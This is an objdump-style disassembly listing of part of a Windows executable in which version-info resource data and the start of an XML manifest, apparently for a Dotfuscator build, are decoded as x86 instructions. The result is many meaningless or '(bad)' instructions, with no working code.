11018163:	push   edi
11018165:	stos   DWORD PTR es:[edi],eax
11018166:	mov    bh,bh
11018168:	cmc    
11018169:	pushf  
1101816a:	je     0x1101816b
1101816c:	div    DWORD PTR [edx-0x1303006e]
11018172:	in     eax,0xff
11018174:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
11018175:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
11018176:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
11018177:	call   DWORD PTR [ecx+0x77ff3853]
1101817d:	inc    ebx
1101817e:	sub    al,0xff
11018180:	add    BYTE PTR [eax],al
11018182:	add    BYTE PTR [edi+0x0],bh
11018185:	add    BYTE PTR [eax],al
11018187:	or     al,BYTE PTR [eax]
11018189:	add    BYTE PTR [eax],al
1101818b:	add    BYTE PTR [eax],al
1101818d:	add    BYTE PTR [eax],al
1101818f:	or     bh,BYTE PTR [edx+0x45]
11018192:	sub    eax,0x5a88f1ff
11018197:	call   DWORD PTR [eax-0x5900c8ad]
1101819d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
1101819e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
1101819f:	(bad)  
110181a0:	(bad)  
110181a1:	(bad)  
110181a2:	std    
110181a3:	(bad)  
110181a4:	(bad)  
110181a5:	(bad)  
110181a6:	std    
110181a7:	(bad)  
110181a8:	(bad)  
110181a9:	(bad)  
110181aa:	(bad)  
110181ab:	(bad)  
110181ac:	(bad)  
110181ad:	(bad)  
110181ae:	(bad)  
110181af:	jmp    DWORD PTR [esi-0x6e005a5b]
110181b5:	push   ebx
110181b6:	cmp    bh,bh
110181b8:	icebp  
110181b9:	mov    BYTE PTR [edx-0x1],bl
110181bc:	jp     0x11018203
110181be:	sub    eax,0xff
110181c3:	jp     0x110181c5
110181c5:	add    BYTE PTR [eax],al
110181c7:	or     al,BYTE PTR [eax]
110181c9:	add    BYTE PTR [eax],al
110181cb:	add    BYTE PTR [eax],al
110181cd:	add    BYTE PTR [eax],al
110181cf:	add    eax,0xff16223d
110181d4:	jp     0x1101821b
110181d6:	sub    eax,0x2c4377ff
110181db:	jmp    FWORD PTR ds:0xa4ff121b
110181e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
110181e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
110181e3:	(bad)  
110181e4:	(bad)  
110181e5:	(bad)  
110181e6:	std    
110181e7:	(bad)  
110181e8:	(bad)  
110181e9:	(bad)  
110181ea:	std    
110181eb:	jmp    DWORD PTR [esp+eiz*4+0x1b2dffa4]
110181f2:	adc    edi,edi
110181f4:	ja     0x11018239
110181f6:	sub    al,0xff
110181f8:	jp     0x1101823f
110181fa:	sub    eax,0x16223dff
110181ff:	inc    DWORD PTR [eax]
11018201:	add    BYTE PTR [eax],al
11018203:	inc    eax
11018204:	add    BYTE PTR [eax],al
11018206:	add    BYTE PTR ds:0x0,al
1101820c:	add    BYTE PTR [eax],al
1101820e:	add    BYTE PTR [eax],al
11018210:	add    BYTE PTR [eax],al
11018212:	add    BYTE PTR ds:0xa000000,al
11018218:	add    BYTE PTR [eax],al
1101821a:	add    BYTE PTR [edx],cl
1101821c:	add    BYTE PTR [eax],al
1101821e:	add    BYTE PTR [ebx+eax*1],cl
11018221:	add    eax,DWORD PTR [ebx]
11018223:	outs   dx,BYTE PTR ds:[esi]
11018224:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
11018225:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
11018226:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
11018227:	cld    
11018228:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
11018229:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
1101822a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
1101822b:	cld    
1101822c:	add    eax,DWORD PTR [ebx]
1101822e:	add    ebp,DWORD PTR [ebp+0x0]
11018231:	add    BYTE PTR [eax],al
11018233:	or     al,0x0
11018235:	add    BYTE PTR [eax],al
11018237:	or     al,BYTE PTR [eax]
11018239:	add    BYTE PTR [eax],al
1101823b:	or     al,BYTE PTR [eax]
1101823d:	add    BYTE PTR [eax],al
1101823f:	or     al,BYTE PTR [eax]
11018241:	add    BYTE PTR [eax],al
11018243:	add    eax,0x0
	...
11018260:	add    BYTE PTR [eax],al
11018262:	add    BYTE PTR [edx],al
11018264:	add    eax,DWORD PTR [ebx]
11018266:	add    esp,DWORD PTR [esi+0x3]
11018269:	add    eax,DWORD PTR [ebx]
1101826b:	add    BYTE PTR gs:[eax],al
1101826e:	add    BYTE PTR [edx],al
	...
11018288:	rol    BYTE PTR [ecx],0xac
1101828b:	inc    ecx
1101828c:	add    BYTE PTR [eax],0xac
1101828f:	inc    ecx
11018290:	add    BYTE PTR [eax],0xac
11018293:	inc    ecx
11018294:	add    BYTE PTR [eax],0xac
11018297:	inc    ecx
11018298:	add    BYTE PTR [eax],0xac
1101829b:	inc    ecx
1101829c:	add    BYTE PTR [eax],al
1101829e:	lods   al,BYTE PTR ds:[esi]
1101829f:	inc    ecx
110182a0:	add    BYTE PTR [eax],al
110182a2:	lods   al,BYTE PTR ds:[esi]
110182a3:	inc    ecx
110182a4:	add    BYTE PTR [eax],al
110182a6:	lods   al,BYTE PTR ds:[esi]
110182a7:	inc    ecx
110182a8:	add    BYTE PTR [eax],al
110182aa:	lods   al,BYTE PTR ds:[esi]
110182ab:	inc    ecx
110182ac:	add    BYTE PTR [eax],al
110182ae:	lods   al,BYTE PTR ds:[esi]
110182af:	inc    ecx
110182b0:	add    BYTE PTR [eax],0xac
110182b3:	inc    ecx
110182b4:	add    BYTE PTR [eax],0xac
110182b7:	inc    ecx
110182b8:	add    BYTE PTR [eax],0xac
110182bb:	inc    ecx
110182bc:	add    BYTE PTR [eax],0xac
110182bf:	inc    ecx
110182c0:	rol    BYTE PTR [ecx],0xac
110182c3:	inc    ecx
110182c4:	cld    
110182c5:	aas    
110182c6:	lods   al,BYTE PTR ds:[esi]
110182c7:	inc    ecx
110182c8:	add    BYTE PTR [eax],al
110182ca:	add    DWORD PTR [eax],eax
110182cc:	(bad)  
110182ce:	xor    BYTE PTR [eax],dh
110182d0:	adc    BYTE PTR [eax],al
110182d2:	add    DWORD PTR [eax],eax
110182d4:	add    al,0x0
110182d6:	push   0x2000006
110182db:	add    BYTE PTR [eax],ch
110182dd:	sub    BYTE PTR [eax],dl
110182df:	add    BYTE PTR [ecx],al
110182e1:	add    BYTE PTR [eax+eax*1],al
110182e4:	enter  0x4,0x0
110182e8:	add    eax,DWORD PTR [eax]
110182ea:	and    BYTE PTR [eax],ah
110182ec:	adc    BYTE PTR [eax],al
110182ee:	add    DWORD PTR [eax],eax
110182f0:	add    al,0x0
110182f2:	call   0x150182f9
110182f7:	add    BYTE PTR [eax],bl
110182f9:	sbb    BYTE PTR [eax],dl
110182fb:	add    BYTE PTR [ecx],al
110182fd:	add    BYTE PTR [eax+eax*1],al
11018300:	call   0x16018306
11018305:	add    BYTE PTR [eax],dl
11018307:	adc    BYTE PTR [eax],dl
11018309:	add    BYTE PTR [ecx],al
1101830b:	add    BYTE PTR [eax+eax*1],al
1101830e:	sub    BYTE PTR [ecx],al
11018310:	add    BYTE PTR [eax],al
11018312:	push   es
11018313:	add    BYTE PTR [eax],dh
11018315:	xor    BYTE PTR [eax],al
11018317:	add    BYTE PTR [ecx],al
11018319:	add    BYTE PTR [eax],cl
1101831b:	add    BYTE PTR [eax+0x700000e],ch
11018321:	add    BYTE PTR [eax],ch
11018323:	sub    BYTE PTR [eax],al
11018325:	add    BYTE PTR [ecx],al
11018327:	add    BYTE PTR [eax],cl
11018329:	add    BYTE PTR [eax+0x800000b],ch
1101832f:	add    BYTE PTR [eax],ah
11018331:	and    BYTE PTR [eax],al
11018333:	add    BYTE PTR [ecx],al
11018335:	add    BYTE PTR [eax],cl
11018337:	add    BYTE PTR [eax+0x9000008],ch
1101833d:	add    BYTE PTR [eax],bl
1101833f:	sbb    BYTE PTR [eax],al
11018341:	add    BYTE PTR [ecx],al
11018343:	add    BYTE PTR [eax],cl
11018345:	add    al,cl
11018347:	push   es
11018348:	add    BYTE PTR [eax],al
1101834a:	or     al,BYTE PTR [eax]
1101834c:	adc    BYTE PTR [eax],dl
1101834e:	add    BYTE PTR [eax],al
11018350:	add    DWORD PTR [eax],eax
11018352:	or     BYTE PTR [eax],al
11018354:	push   0xb000005
11018359:	add    BYTE PTR [eax],dh
1101835b:	xor    BYTE PTR [eax],al
1101835d:	add    BYTE PTR [ecx],al
1101835f:	add    BYTE PTR [eax],ah
11018361:	add    BYTE PTR [eax+0xc000025],ch
11018367:	add    BYTE PTR [eax],ch
11018369:	sub    BYTE PTR [eax],al
1101836b:	add    BYTE PTR [ecx],al
1101836d:	add    BYTE PTR [eax],ah
1101836f:	add    BYTE PTR [eax+0x1a],ch
11018372:	add    BYTE PTR [eax],al
11018374:	or     eax,0x202000
11018379:	add    BYTE PTR [ecx],al
1101837b:	add    BYTE PTR [eax],ah
1101837d:	add    BYTE PTR [eax+0xe000010],ch
11018383:	add    BYTE PTR [eax],bl
11018385:	sbb    BYTE PTR [eax],al
11018387:	add    BYTE PTR [ecx],al
11018389:	add    BYTE PTR [eax],ah
1101838b:	add    BYTE PTR [eax+0xf000009],cl
11018391:	add    BYTE PTR [eax],dl
11018393:	adc    BYTE PTR [eax],al
11018395:	add    BYTE PTR [ecx],al
11018397:	add    BYTE PTR [eax],ah
11018399:	add    BYTE PTR [eax+0x4],ch
1101839c:	add    BYTE PTR [eax],al
1101839e:	adc    BYTE PTR [eax],al
110183a0:	mov    ah,0x3
110183a2:	xor    al,0x0
110183a4:	add    BYTE PTR [eax],al
110183a6:	push   esi
110183a7:	add    BYTE PTR [ebx+0x0],dl
110183aa:	pop    edi
110183ab:	add    BYTE PTR [esi+0x0],dl
110183ae:	inc    ebp
110183af:	add    BYTE PTR [edx+0x0],dl
110183b2:	push   ebx
110183b3:	add    BYTE PTR [ecx+0x0],cl
110183b6:	dec    edi
110183b7:	add    BYTE PTR [esi+0x0],cl
110183ba:	pop    edi
110183bb:	add    BYTE PTR [ecx+0x0],cl
110183be:	dec    esi
110183bf:	add    BYTE PTR [esi+0x0],al
110183c2:	dec    edi
110183c3:	add    BYTE PTR [eax],al
110183c5:	add    BYTE PTR [eax],al
110183c7:	add    BYTE PTR [ebp+0xfeef04],bh
110183cd:	add    BYTE PTR [ecx],al
110183cf:	add    BYTE PTR ds:0x72000500,al
110183d5:	jb     0x11018380
110183d7:	adc    DWORD PTR ds:0x72000500,eax
110183dd:	jb     0x11018388
110183df:	adc    DWORD PTR [edi],edi
110183e1:	add    BYTE PTR [eax],al
110183e3:	add    BYTE PTR [eax],al
110183e5:	add    BYTE PTR [eax],al
110183e7:	add    BYTE PTR [eax+eax*1],al
110183ea:	add    BYTE PTR [eax],al
110183ec:	add    DWORD PTR [eax],eax
	...
110183fa:	add    BYTE PTR [eax],al
110183fc:	inc    esp
110183fd:	add    BYTE PTR [eax],al
110183ff:	add    BYTE PTR [ecx],al
11018401:	add    BYTE PTR [esi+0x0],dl
11018404:	popa   
11018405:	add    BYTE PTR [edx+0x0],dh
11018408:	inc    esi
11018409:	add    BYTE PTR [ecx+0x0],ch
1101840c:	ins    BYTE PTR es:[edi],dx
1101840d:	add    BYTE PTR [ebp+0x0],ah
11018410:	dec    ecx
11018411:	add    BYTE PTR [esi+0x0],ch
11018414:	data16 add BYTE PTR [edi+0x0],ch
11018418:	add    BYTE PTR [eax],al
1101841a:	add    BYTE PTR [eax],al
1101841c:	and    al,0x0
1101841e:	add    al,0x0
11018420:	add    BYTE PTR [eax],al
11018422:	push   esp
11018423:	add    BYTE PTR [edx+0x0],dh
11018426:	popa   
11018427:	add    BYTE PTR [esi+0x0],ch
1101842a:	jae    0x1101842c
1101842c:	ins    BYTE PTR es:[edi],dx
1101842d:	add    BYTE PTR [ecx+0x0],ah
11018430:	je     0x11018432
11018432:	imul   eax,DWORD PTR [eax],0x6e006f
11018438:	add    BYTE PTR [eax],al
1101843a:	add    BYTE PTR [eax],al
1101843c:	add    BYTE PTR [eax],al
1101843e:	mov    al,0x4
11018440:	adc    al,0x3
11018442:	add    BYTE PTR [eax],al
11018444:	add    DWORD PTR [eax],eax
11018446:	push   ebx
11018447:	add    BYTE PTR [eax+eax*1+0x72],dh
1101844b:	add    BYTE PTR [ecx+0x0],ch
1101844e:	outs   dx,BYTE PTR ds:[esi]
1101844f:	add    BYTE PTR [edi+0x0],ah
11018452:	inc    esi
11018453:	add    BYTE PTR [ecx+0x0],ch
11018456:	ins    BYTE PTR es:[edi],dx
11018457:	add    BYTE PTR [ebp+0x0],ah
1101845a:	dec    ecx
1101845b:	add    BYTE PTR [esi+0x0],ch
1101845e:	data16 add BYTE PTR [edi+0x0],ch
11018462:	add    BYTE PTR [eax],al
11018464:	lock add al,BYTE PTR [eax]
11018467:	add    BYTE PTR [ecx],al
11018469:	add    BYTE PTR [eax],dh
1101846b:	add    BYTE PTR [eax],dh
1101846d:	add    BYTE PTR [eax],dh
1101846f:	add    BYTE PTR [eax],dh
11018471:	add    BYTE PTR [eax],dh
11018473:	add    BYTE PTR [eax+eax*1],dh
11018476:	bound  eax,QWORD PTR [eax]
11018478:	xor    BYTE PTR [eax],al
1101847a:	add    BYTE PTR [eax],al
1101847c:	push   esp
1101847d:	add    BYTE PTR [edx],bl
1101847f:	add    BYTE PTR [ecx],al
11018481:	add    BYTE PTR [ebx+0x0],al
11018484:	outs   dx,DWORD PTR ds:[esi]
11018485:	add    BYTE PTR [ebp+0x0],ch
11018488:	jo     0x1101848a
1101848a:	popa   
1101848b:	add    BYTE PTR [esi+0x0],ch
1101848e:	jns    0x11018490
11018490:	dec    esi
11018491:	add    BYTE PTR [ecx+0x0],ah
11018494:	ins    DWORD PTR es:[edi],dx
11018495:	add    BYTE PTR [ebp+0x0],ah
11018498:	add    BYTE PTR [eax],al
1101849a:	add    BYTE PTR [eax],al
1101849c:	push   eax
1101849d:	add    BYTE PTR [edx+0x0],dh
110184a0:	add    BYTE PTR gs:[ebp+0x0],al
110184a4:	ins    DWORD PTR es:[edi],dx
110184a5:	add    BYTE PTR [eax+0x0],dh
110184a8:	je     0x110184aa
110184aa:	imul   eax,DWORD PTR [eax],0x650076
110184b0:	and    BYTE PTR [eax],al
110184b2:	push   ebx
110184b3:	add    BYTE PTR [edi+0x0],ch
110184b6:	ins    BYTE PTR es:[edi],dx
110184b7:	add    BYTE PTR [ebp+0x0],dh
110184ba:	je     0x110184bc
110184bc:	imul   eax,DWORD PTR [eax],0x6e006f
110184c2:	jae    0x110184c4
110184c4:	sub    al,0x0
110184c6:	and    BYTE PTR [eax],al
110184c8:	dec    esp
110184c9:	add    BYTE PTR [eax+eax*1+0x43],cl
110184cd:	add    BYTE PTR [eax],al
110184cf:	add    BYTE PTR [eax+0x0],al
110184d2:	or     al,0x0
110184d4:	add    DWORD PTR [eax],eax
110184d6:	inc    esi
110184d7:	add    BYTE PTR [ecx+0x0],ch
110184da:	ins    BYTE PTR es:[edi],dx
110184db:	add    BYTE PTR [ebp+0x0],ah
110184de:	inc    esp
110184df:	add    BYTE PTR [ebp+0x0],ah
110184e2:	jae    0x110184e4
110184e4:	arpl   WORD PTR [eax],ax
110184e6:	jb     0x110184e8
110184e8:	imul   eax,DWORD PTR [eax],0x740070
110184ee:	imul   eax,DWORD PTR [eax],0x6e006f
110184f4:	add    BYTE PTR [eax],al
110184f6:	add    BYTE PTR [eax],al
110184f8:	inc    esp
110184f9:	add    BYTE PTR [edi+0x0],ch
110184fc:	je     0x110184fe
110184fe:	data16 add BYTE PTR [ebp+0x0],dh
11018502:	jae    0x11018504
11018504:	arpl   WORD PTR [eax],ax
11018506:	popa   
11018507:	add    BYTE PTR [eax+eax*1+0x6f],dh
1101850b:	add    BYTE PTR [edx+0x0],dh
1101850e:	add    BYTE PTR [eax],al
11018510:	inc    eax
11018511:	add    BYTE PTR [edi],cl
11018513:	add    BYTE PTR [ecx],al
11018515:	add    BYTE PTR [esi+0x0],al
11018518:	imul   eax,DWORD PTR [eax],0x65006c
1101851e:	push   esi
1101851f:	add    BYTE PTR [ebp+0x0],ah
11018522:	jb     0x11018524
11018524:	jae    0x11018526
11018526:	imul   eax,DWORD PTR [eax],0x6e006f
1101852c:	add    BYTE PTR [eax],al
1101852e:	add    BYTE PTR [eax],al
11018530:	xor    eax,0x35002e00
11018535:	add    BYTE PTR [esi],ch
11018537:	add    BYTE PTR [eax+eax*1],dh
1101853a:	xor    eax,0x31003200
1101853f:	add    BYTE PTR [esi],ch
11018541:	add    BYTE PTR [edx],dh
11018543:	add    BYTE PTR [ecx],bh
11018545:	add    BYTE PTR [edx],dh
11018547:	add    BYTE PTR [ecx],bh
11018549:	add    BYTE PTR [eax],bh
1101854b:	add    BYTE PTR [eax],al
1101854d:	add    BYTE PTR [eax],al
1101854f:	add    BYTE PTR [eax+0x0],al
11018552:	adc    BYTE PTR [eax],al
11018554:	add    DWORD PTR [eax],eax
11018556:	dec    ecx
11018557:	add    BYTE PTR [esi+0x0],ch
1101855a:	je     0x1101855c
1101855c:	add    BYTE PTR gs:[edx+0x0],dh
11018560:	outs   dx,BYTE PTR ds:[esi]
11018561:	add    BYTE PTR [ecx+0x0],ah
11018564:	ins    BYTE PTR es:[edi],dx
11018565:	add    BYTE PTR [esi+0x0],cl
11018568:	popa   
11018569:	add    BYTE PTR [ebp+0x0],ch
1101856c:	add    BYTE PTR gs:[eax],al
1101856f:	add    BYTE PTR [eax+eax*1+0x6f],ah
11018573:	add    BYTE PTR [eax+eax*1+0x66],dh
11018577:	add    BYTE PTR [ebp+0x0],dh
1101857a:	jae    0x1101857c
1101857c:	arpl   WORD PTR [eax],ax
1101857e:	popa   
1101857f:	add    BYTE PTR [eax+eax*1+0x6f],dh
11018583:	add    BYTE PTR [edx+0x0],dh
11018586:	add    BYTE PTR cs:[ebp+0x0],ah
1101858a:	js     0x1101858c
1101858c:	add    BYTE PTR gs:[eax],al
1101858f:	add    BYTE PTR [eax+0x0],bh
11018592:	sub    DWORD PTR [eax],eax
11018594:	add    DWORD PTR [eax],eax
11018596:	dec    esp
11018597:	add    BYTE PTR [ebp+0x0],ah
1101859a:	add    BYTE PTR [bx+di+0x0],ah
1101859e:	ins    BYTE PTR es:[edi],dx
1101859f:	add    BYTE PTR [ebx+0x0],al
110185a2:	outs   dx,DWORD PTR ds:[esi]
110185a3:	add    BYTE PTR [eax+0x0],dh
110185a6:	jns    0x110185a8
110185a8:	jb     0x110185aa
110185aa:	imul   eax,DWORD PTR [eax],0x680067
110185b0:	je     0x110185b2
110185b2:	add    BYTE PTR [eax],al
110185b4:	inc    ebx
110185b5:	add    BYTE PTR [edi+0x0],ch
110185b8:	jo     0x110185ba
110185ba:	jns    0x110185bc
110185bc:	jb     0x110185be
110185be:	imul   eax,DWORD PTR [eax],0x680067
110185c4:	je     0x110185c6
110185c6:	and    BYTE PTR [eax],al
110185c8:	xor    al,BYTE PTR [eax]
110185ca:	xor    BYTE PTR [eax],al
110185cc:	xor    BYTE PTR [eax],al
110185ce:	xor    al,BYTE PTR [eax]
110185d0:	sub    eax,0x30003200
110185d5:	add    BYTE PTR [ecx],dh
110185d7:	add    BYTE PTR [edx],dh
110185d9:	add    BYTE PTR [eax+eax*1],ch
110185dc:	and    BYTE PTR [eax],al
110185de:	inc    ecx
110185df:	add    BYTE PTR [eax+eax*1+0x6c],ch
110185e3:	add    BYTE PTR [eax],ah
110185e5:	add    BYTE PTR [edx+0x0],dl
110185e8:	imul   eax,DWORD PTR [eax],0x680067
110185ee:	je     0x110185f0
110185f0:	jae    0x110185f2
110185f2:	and    BYTE PTR [eax],al
110185f4:	push   edx
110185f5:	add    BYTE PTR [ebp+0x0],ah
110185f8:	jae    0x110185fa
110185fa:	add    BYTE PTR gs:[edx+0x0],dh
110185fe:	jbe    0x11018600
11018600:	add    BYTE PTR gs:[eax+eax*1+0x0],ah
11018605:	add    BYTE PTR [eax],al
11018607:	add    BYTE PTR [eax+0x0],cl
1101860a:	adc    BYTE PTR [eax],al
1101860c:	add    DWORD PTR [eax],eax
1101860e:	dec    edi
1101860f:	add    BYTE PTR [edx+0x0],dh
11018612:	imul   eax,DWORD PTR [eax],0x690067
11018618:	outs   dx,BYTE PTR ds:[esi]
11018619:	add    BYTE PTR [ecx+0x0],ah
1101861c:	ins    BYTE PTR es:[edi],dx
1101861d:	add    BYTE PTR [esi+0x0],al
11018620:	imul   eax,DWORD PTR [eax],0x65006c
11018626:	outs   dx,BYTE PTR ds:[esi]
11018627:	add    BYTE PTR [ecx+0x0],ah
1101862a:	ins    DWORD PTR es:[edi],dx
1101862b:	add    BYTE PTR [ebp+0x0],ah
1101862e:	add    BYTE PTR [eax],al
11018630:	add    BYTE PTR fs:[edi+0x0],ch
11018634:	je     0x11018636
11018636:	data16 add BYTE PTR [ebp+0x0],dh
1101863a:	jae    0x1101863c
1101863c:	arpl   WORD PTR [eax],ax
1101863e:	popa   
1101863f:	add    BYTE PTR [eax+eax*1+0x6f],dh
11018643:	add    BYTE PTR [edx+0x0],dh
11018646:	add    BYTE PTR cs:[ebp+0x0],ah
1101864a:	js     0x1101864c
1101864c:	add    BYTE PTR gs:[eax],al
1101864f:	add    BYTE PTR [eax+0x0],bh
11018652:	sub    al,0x0
11018654:	add    DWORD PTR [eax],eax
11018656:	push   eax
11018657:	add    BYTE PTR [edx+0x0],dh
1101865a:	outs   dx,DWORD PTR ds:[esi]
1101865b:	add    BYTE PTR [eax+eax*1+0x75],ah
1101865f:	add    BYTE PTR [ebx+0x0],ah
11018662:	je     0x11018664
11018664:	dec    esi
11018665:	add    BYTE PTR [ecx+0x0],ah
11018668:	ins    DWORD PTR es:[edi],dx
11018669:	add    BYTE PTR [ebp+0x0],ah
1101866c:	add    BYTE PTR [eax],al
1101866e:	add    BYTE PTR [eax],al
11018670:	inc    esp
11018671:	add    BYTE PTR [edi+0x0],ch
11018674:	je     0x11018676
11018676:	data16 add BYTE PTR [ebp+0x0],dh
1101867a:	jae    0x1101867c
1101867c:	arpl   WORD PTR [eax],ax
1101867e:	popa   
1101867f:	add    BYTE PTR [eax+eax*1+0x6f],dh
11018683:	add    BYTE PTR [edx+0x0],dh
11018686:	and    BYTE PTR [eax],al
11018688:	popa   
11018689:	add    BYTE PTR [esi+0x0],ch
1101868c:	add    BYTE PTR fs:[eax],ah
1101868f:	add    BYTE PTR [ecx+0x0],al
11018692:	outs   dx,BYTE PTR ds:[esi]
11018693:	add    BYTE PTR [ecx+0x0],ah
11018696:	ins    BYTE PTR es:[edi],dx
11018697:	add    BYTE PTR [ecx+0x0],bh
1101869a:	je     0x1101869c
1101869c:	imul   eax,DWORD PTR [eax],0x730063
110186a2:	and    BYTE PTR [eax],al
110186a4:	inc    ebx
110186a5:	add    BYTE PTR [edi+0x0],ch
110186a8:	ins    DWORD PTR es:[edi],dx
110186a9:	add    BYTE PTR [ebp+0x0],ch
110186ac:	jne    0x110186ae
110186ae:	outs   dx,BYTE PTR ds:[esi]
110186af:	add    BYTE PTR [ecx+0x0],ch
110186b2:	je     0x110186b4
110186b4:	jns    0x110186b6
110186b6:	and    BYTE PTR [eax],al
110186b8:	inc    ebp
110186b9:	add    BYTE PTR [eax+eax*1+0x69],ah
110186bd:	add    BYTE PTR [eax+eax*1+0x69],dh
110186c1:	add    BYTE PTR [edi+0x0],ch
110186c4:	outs   dx,BYTE PTR ds:[esi]
110186c5:	add    BYTE PTR [eax],al
110186c7:	add    BYTE PTR [eax+eax*1+0xf],al
110186cb:	add    BYTE PTR [ecx],al
110186cd:	add    BYTE PTR [eax+0x0],dl
110186d0:	jb     0x110186d2
110186d2:	outs   dx,DWORD PTR ds:[esi]
110186d3:	add    BYTE PTR [eax+eax*1+0x75],ah
110186d7:	add    BYTE PTR [ebx+0x0],ah
110186da:	je     0x110186dc
110186dc:	push   esi
110186dd:	add    BYTE PTR [ebp+0x0],ah
110186e0:	jb     0x110186e2
110186e2:	jae    0x110186e4
110186e4:	imul   eax,DWORD PTR [eax],0x6e006f
110186ea:	add    BYTE PTR [eax],al
110186ec:	xor    eax,0x35002e00
110186f1:	add    BYTE PTR [esi],ch
110186f3:	add    BYTE PTR [eax+eax*1],dh
110186f6:	xor    eax,0x31003200
110186fb:	add    BYTE PTR [esi],ch
110186fd:	add    BYTE PTR [edx],dh
110186ff:	add    BYTE PTR [ecx],bh
11018701:	add    BYTE PTR [edx],dh
11018703:	add    BYTE PTR [ecx],bh
11018705:	add    BYTE PTR [eax],bh
11018707:	add    BYTE PTR [eax],al
11018709:	add    BYTE PTR [eax],al
1101870b:	add    BYTE PTR [eax+0x0],cl
1101870e:	sldt   WORD PTR [ecx]
11018711:	add    BYTE PTR [ecx+0x0],al
11018714:	jae    0x11018716
11018716:	jae    0x11018718
11018718:	add    BYTE PTR gs:[ebp+0x0],ch
1101871c:	bound  eax,QWORD PTR [eax]
1101871e:	ins    BYTE PTR es:[edi],dx
1101871f:	add    BYTE PTR [ecx+0x0],bh
11018722:	and    BYTE PTR [eax],al
11018724:	push   esi
11018725:	add    BYTE PTR [ebp+0x0],ah
11018728:	jb     0x1101872a
1101872a:	jae    0x1101872c
1101872c:	imul   eax,DWORD PTR [eax],0x6e006f
11018732:	add    BYTE PTR [eax],al
11018734:	xor    eax,0x35002e00
11018739:	add    BYTE PTR [esi],ch
1101873b:	add    BYTE PTR [eax+eax*1],dh
1101873e:	xor    eax,0x31003200
11018743:	add    BYTE PTR [esi],ch
11018745:	add    BYTE PTR [edx],dh
11018747:	add    BYTE PTR [ecx],bh
11018749:	add    BYTE PTR [edx],dh
1101874b:	add    BYTE PTR [ecx],bh
1101874d:	add    BYTE PTR [eax],bh
	...
11018757:	add    BYTE PTR [ecx+eiz*2],bh
1101875a:	jae    0x110187cf
1101875c:	gs ins DWORD PTR es:[edi],dx
1101875e:	bound  ebp,QWORD PTR [ecx+edi*2+0x20]
11018762:	js     0x110187d1
11018764:	ins    BYTE PTR es:[edi],dx
11018765:	outs   dx,BYTE PTR ds:[esi]
11018766:	jae    0x110187a5
11018768:	and    dh,BYTE PTR [ebp+0x72]
1101876b:	outs   dx,BYTE PTR ds:[esi]
1101876c:	cmp    dh,BYTE PTR [ebx+0x63]
1101876f:	push   0x73616d65
11018774:	sub    eax,0x7263696d
11018779:	outs   dx,DWORD PTR ds:[esi]
1101877a:	jae    0x110187eb
1101877c:	data16 je 0x110187ac
1101877f:	arpl   WORD PTR [edi+0x6d],bp
11018782:	cmp    ah,BYTE PTR [ecx+0x73]
11018785:	ins    DWORD PTR es:[edi],dx
11018786:	cs jbe 0x110187ba
11018789:	and    ah,BYTE PTR [eax]
1101878b:	ins    DWORD PTR es:[edi],dx
1101878c:	popa   
1101878d:	outs   dx,BYTE PTR ds:[esi]
1101878e:	imul   esp,DWORD PTR [esi+0x65],0x65567473
11018795:	jb     0x1101880a
11018797:	imul   ebp,DWORD PTR [edi+0x6e],0x2e31223d
1101879e:	xor    BYTE PTR [edx],ah
110187a0:	ds or  eax,0x3c20200a
110187a6:	popa   
110187a7:	jae    0x1101881c
110187a9:	gs ins DWORD PTR es:[edi],dx
110187ab:	bound  ebp,QWORD PTR [ecx+edi*2+0x49]
110187af:	fs outs dx,BYTE PTR gs:[esi]
110187b2:	je     0x1101881d
110187b4:	je     0x1101882f
110187b6:	and    BYTE PTR [esi+0x65],dh
110187b9:	jb     0x1101882e
110187bb:	imul   ebp,DWORD PTR [edi+0x6e],0x2e35223d
110187c2:	xor    eax,0x3235342e
110187c7:	xor    DWORD PTR [esi],ebp
110187c9:	xor    bh,BYTE PTR [ecx]
110187cb:	xor    bh,BYTE PTR [ecx]
110187cd:	cmp    BYTE PTR [edx],ah
110187cf:	and    BYTE PTR [eax+0x72],dh
110187d2:	outs   dx,DWORD PTR ds:[esi]
110187d3:	arpl   WORD PTR [ebp+0x73],sp
110187d6:	jae    0x11018847
110187d8:	jb     0x1101881b
110187da:	jb     0x1101883f
110187dc:	push   0x63657469
110187e1:	je     0x11018858
110187e3:	jb     0x1101884a
110187e5:	cmp    eax,0x20222a22
110187ea:	outs   dx,BYTE PTR ds:[esi]
110187eb:	popa   
110187ec:	ins    DWORD PTR es:[edi],dx
110187ed:	gs cmp eax,0x746f6422
110187f3:	data16 jne 0x11018869
110187f6:	arpl   WORD PTR [ecx+0x74],sp
110187f9:	outs   dx,DWORD PTR ds:[esi]
110187fa:	jb     0x1101881e
110187fc:	and    BYTE PTR [ecx+edi*2+0x70],dh
11018800:	gs cmp eax,0x6e697722
11018806:	xor    esi,DWORD PTR [edx]
11018808:	and    bh,BYTE PTR [esi]
1101880a:	cmp    al,0x2f
1101880c:	popa   
1101880d:	jae    0x11018882
1101880f:	gs ins DWORD PTR es:[edi],dx
11018811:	bound  ebp,QWORD PTR [ecx+edi*2+0x49]
11018815:	fs outs dx,BYTE PTR gs:[esi]
11018818:	je     0x11018883
1101881a:	je     0x11018895
1101881c:	ds or  eax,0x3c20200a
11018822:	fs gs jae 0x11018889
11018826:	jb     0x11018891
11018828:	jo     0x1101889e
1101882a:	imul   ebp,DWORD PTR [edi+0x6e],0x746f643e
11018831:	data16 jne 0x110188a7
11018834:	arpl   WORD PTR [ecx+0x74],sp
11018837:	outs   dx,DWORD PTR ds:[esi]
11018838:	jb     0x11018876
1101883a:	das    
1101883b:	fs gs jae 0x110188a2
1101883f:	jb     0x110188aa
11018841:	jo     0x110188b7
11018843:	imul   ebp,DWORD PTR [edi+0x6e],0x200a0d3e
1101884a:	and    BYTE PTR [esp+eiz*2],bh
